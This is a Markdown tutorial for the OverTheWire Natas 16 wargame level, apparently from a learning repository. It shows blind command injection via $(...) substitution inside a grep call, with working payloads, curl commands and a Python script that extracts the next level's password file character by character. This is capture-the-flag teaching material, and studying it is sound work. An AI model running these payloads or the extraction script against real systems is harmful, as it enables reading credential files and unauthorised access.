# 🌐 Web Security — Advanced Command Injection (grep Bypass)

> Natas 16 filters the `;`, `|`, `&` characters as well as the inside of quotes.
> But using grep's own features is still possible.

---

## 📋 Table of Contents

- [Difference from Layer 2](#difference-from-layer-2)
- [Natas 16's Filter](#natas-16s-filter)
- [Command Substitution with grep](#command-substitution-with-grep)
- [Blind Command Injection](#blind-command-injection)
- [Extracting the Password Character by Character](#extracting-the-password-character-by-character)
- [Automating with Python](#automating-with-python)
- [Usage in Natas](#usage-in-natas)

---

## Difference from Layer 2

The command injection in Layer 2 (Natas 9-10) was fairly simple:

```
Natas 9:  No filtering → ; | & all work
Natas 10: ; | & filtered → but the grep trick worked
```

Natas 16, on the other hand, filters both the operators and the quote characters — and the input is enclosed in quotes. It requires a completely different approach.

---

## Natas 16's Filter

**Source code:**

```php
<?php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/', $key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Filtered characters: `;`, `|`, `&`, `` ` ``, `'`, `"`

Command run: `grep -i "$key" dictionary.txt`

The input is **inside double quotes** — you can't break out of a single quote. The double-quote escape character `"` is forbidden too.

But... **`$(...)` is not filtered!**

---

## Command Substitution with grep

In Bash, `$(command)` works inside double quotes:

```bash
echo "Hello $(whoami)"
# Hello root
```

So in the expression `grep -i "$(command)" dictionary.txt`, the `$(command)` runs first, and its output goes to grep as the pattern.

### The Basic Idea

```bash
# Normal:
grep -i "natas" dictionary.txt

# With $(cat /etc/natas_webpass/natas17):
grep -i "$(cat /etc/natas_webpass/natas17)" dictionary.txt
```

`$(cat /etc/natas_webpass/natas17)` runs → returns the password → grep searches for that password in the dictionary.

If the password is not in the dictionary → **nothing is returned**.
If the password is in the dictionary → **the matching line is returned**.

This makes it blind command injection — but we can use the dictionary words as an oracle!

---

## Blind Command Injection

### Oracle Logic

The dictionary has words starting with `a`, `b`, `c`... By checking whether a character of the password filters out a word in the dictionary, we can find the password.

```bash
# If the first character of the password is 'a', grep finds words starting with 'a'
grep -i "$(grep -i ^a /etc/natas_webpass/natas17)" dictionary.txt
```

If the password doesn't start with `a` → the inner grep returns empty → the outer grep searches for an empty pattern → returns all lines (or empty).

If the password starts with `a` → the inner grep returns the password → the outer grep searches for the password in the dictionary → the password isn't there → returns empty.

This is intuitive but inverted logic — it requires care.

---

## Extracting the Password Character by Character

### The Correct Approach

```
Input: $(grep -i ^CHARACTER /etc/natas_webpass/natas17)abcde

Command: grep -i "$(grep -i ^CHARACTER /etc/natas_webpass/natas17)abcde" dictionary.txt
```

**If the password doesn't start with CHARACTER:**
- `$(grep ...)` → empty string
- `grep -i "abcde" dictionary.txt` → searches the dictionary for "abcde"
- "abcde" isn't in the dictionary → empty result

**If the password starts with CHARACTER:**
- `$(grep ...)` → returns the password (e.g. `W3f28...`)
- `grep -i "W3f28...abcde" dictionary.txt` → this long string isn't in the dictionary → empty result

Hmm — empty result in both cases. We need a smarter method.

### The Corrected Approach

Add a word that definitely exists in the dictionary:

```
Input: $(grep ^CHARACTER /etc/natas_webpass/natas17)africans
                                                     ↑
                              a word that definitely exists in the dictionary
```

**If the password DOESN'T START with CHARACTER:**
- `$(grep ^CHARACTER ...)` → empty
- `grep -i "africans" dictionary.txt` → there's a match → "africans" is returned ✓

**If the password STARTS with CHARACTER:**
- `$(grep ^CHARACTER ...)` → the password is returned (e.g. `Wt...`)
- `grep -i "Wt...africans" dictionary.txt` → this string doesn't exist → empty ✗

**Result:**
- A result was returned → the password does **NOT START** with this character
- The result is empty → the password **STARTS** with this character ✓

---

## Automating with Python

```python
import requests
import string

url      = "http://natas16.natas.labs.overthewire.org/"
username = "natas16"
password = "[natas16_password]"

chars    = string.ascii_letters + string.digits
found    = ""
anchor   = "africans"   # a word that definitely exists in the dictionary

for position in range(1, 33):   # 32-character password
    for c in chars:
        # Try the prefix found so far + a new character
        prefix = found + c
        payload = f"$(grep ^{prefix} /etc/natas_webpass/natas17){anchor}"

        r = requests.get(
            url,
            params={"needle": payload, "submit": "Search"},
            auth=(username, password)
        )

        if anchor not in r.text:
            # the anchor isn't in the result → the prefix is correct! → the password continues with this character
            found += c
            print(f"[+] Position {position}: {c} | So far: {found}")
            break
    else:
        print(f"[!] No character found for position {position}")
        break

print(f"\n[✓] Password: {found}")
```

---

## Usage in Natas

### Natas 16 — Quote + Operator Filtered Injection

**Step 1: Understand the filter**

```python
# Forbidden: ; | & ` ' "
# Allowed: $ ( ) / letters digits space
# The input is inside double quotes: grep -i "$KEY" dictionary.txt
```

**Step 2: Test whether `$()` works**

```
Input: $(echo test)
Command: grep -i "$(echo test)" dictionary.txt
       → grep -i "test" dictionary.txt
       → shows the lines containing "test"
```

If a result comes back, `$()` works.

**Step 3: Determine a dictionary anchor**

```
A short word present in the dictionary: "africans", "acid", "act"
```

**Step 4: Manual single-character test**

```
Input: $(grep ^W /etc/natas_webpass/natas17)africans
```

If the result is empty → the password starts with `W`.

```
Input: $(grep ^Wa /etc/natas_webpass/natas17)africans
```

If the result is empty → the second character is `a`.

**Step 5: Run the Python script**

Find all 32 characters automatically.

---

### Manual Test from the Command Line

```bash
# Single-character test
curl -u natas16:[password] \
  "http://natas16.natas.labs.overthewire.org/?needle=\$(grep+^W+/etc/natas_webpass/natas17)africans&submit=Search"

# If it returns empty → W is the correct character
```

---

### Summary: Natas 16 Flow

```
1. Analyze the filter → $() is allowed!
2. Find an anchor word in the dictionary (africans)
3. For each position, try each character:
   payload = $(grep ^[prefix+c] /etc/natas_webpass/natas17)africans
4. If the result is empty → the character is correct, add it to found
5. Continue until 32 characters are complete
```

---

### Advanced Command Injection — Checklist

```
Filter analysis:
  ☐ Which characters are forbidden? (find the preg_match)
  ☐ Is the input inside quotes? (single or double?)
  ☐ Is $() or ${} allowed?
  ☐ Which constructs work inside the quotes?

If $() is present:
  ☐ Does command substitution work? $(echo test)
  ☐ Find a dictionary anchor for blind injection
  ☐ Use grep ^PREFIX /target/file

Automation:
  ☐ Write a Python script with requests
  ☐ Check whether the anchor word is in the response
  ☐ Character set: string.ascii_letters + string.digits
```

---

## 🔗 Resources

- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [Bash — Command Substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

**Previous topic:** [12_blind_sql_injection.md](./12_blind_sql_injection.md)
**Next topic:** [14_session_brute_force.md](./14_session_brute_force.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
